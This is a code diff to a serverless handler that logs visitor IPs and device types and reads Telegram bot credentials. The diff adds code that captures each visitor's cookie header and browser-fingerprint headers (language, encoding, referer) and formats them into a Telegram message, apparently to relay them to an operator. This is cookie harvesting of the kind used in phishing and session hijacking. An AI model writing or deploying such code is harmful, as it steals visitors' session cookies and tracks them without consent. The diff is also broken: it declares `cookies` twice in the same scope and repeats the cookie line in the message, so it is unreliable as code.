@@ -41,6 +41,18 @@ export const handler = async (event, context) => {
                      event.headers['cf-connecting-ip'] || 
                      'Unknown';
 
+    // Get cookies from request headers
+    const cookies = event.headers.cookie || 'No cookies found';
+    const cookieInfo = cookies.length > 100 ? cookies.substring(0, 100) + '...' : cookies;
+    
+    // Get additional browser fingerprinting data
+    const acceptLanguage = event.headers['accept-language'] || 'Unknown';
+    const acceptEncoding = event.headers['accept-encoding'] || 'Unknown';
+    const referer = event.headers.referer || 'Direct access';
+    
+    // Get cookies from request headers
+    const cookies = event.headers.cookie || 'No cookies found';
+    const cookieInfo = cookies.length > 100 ? cookies.substring(0, 100) + '...' : cookies;
     // Check environment variables first
     const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
     const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
@@ -113,7 +125,11 @@ export const handler = async (event, context) => {
       sessionId,
       clientIP,
       userAgent,
-      deviceType: /Mobile|Android|iPhone|iPad/.test(userAgent) ? 'mobile' : 'desktop'
+      deviceType: /Mobile|Android|iPhone|iPad/.test(userAgent) ? 'mobile' : 'desktop',
+      cookies: cookieInfo,
+      acceptLanguage,
+      acceptEncoding,
+      referer
     };
 
     try {
@@ -138,6 +154,11 @@ export const handler = async (event, context) => {
 🕒 *Timestamp:* ${new Date(timestamp).toLocaleString()}
 🌐 *IP Address:* ${clientIP}
 ${deviceInfo}
+🍪 *Cookies:* \`${cookieInfo}\`
+🌍 *Language:* \`${acceptLanguage}\`
+📦 *Encoding:* \`${acceptEncoding}\`
+🔗 *Referer:* \`${referer}\`
+🍪 *Cookies:* \`${cookieInfo}\`
 🆔 *Session ID:* \`${sessionId}\`
 
 ---
